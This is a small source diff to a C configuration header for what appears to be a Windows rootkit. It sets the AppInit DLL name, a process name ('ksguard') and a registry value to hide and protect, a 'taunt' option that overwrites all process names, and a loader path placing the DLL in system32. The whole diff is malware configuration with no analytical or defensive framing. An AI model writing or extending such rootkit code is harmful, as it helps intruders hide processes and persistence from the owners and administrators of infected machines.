@@ -1,6 +1,7 @@
+#ifndef LOADER
 #define APPINIT L"appinit"
 
-#define DLL L"kingsguard" // dll name
+#define DLL L"kgsgrd" // dll name
 #define PROCESSA "ksguard" // Process name to hide / protect
 #define PROCESSW L"ksguard" // Process name to hide / protect
 #define KEY L"ksguard" // Reg value to hide / protect
@@ -11,4 +12,9 @@
 
 #if TAUNT
 #define TAUNTVALUE L"kingsguard" // overwrite all process names 
+#endif
+
+#else
+#define DLL L"C:\\windows\\system32\\kgsgrd.dll"
+
 #endif
